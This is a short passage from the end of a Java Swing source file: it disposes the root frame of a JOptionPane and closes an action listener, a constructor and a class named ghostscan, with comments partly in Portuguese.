		        	 Frame option = JOptionPane.getRootFrame();
			         option.dispose();
		        }
				
				
			
			}
		}//public void do action
			
	}); //actionlistener
		
		
		
		
} //método construtor ghostcan
	
	
		
} //class ghostscan
		
		
	
	
	
		


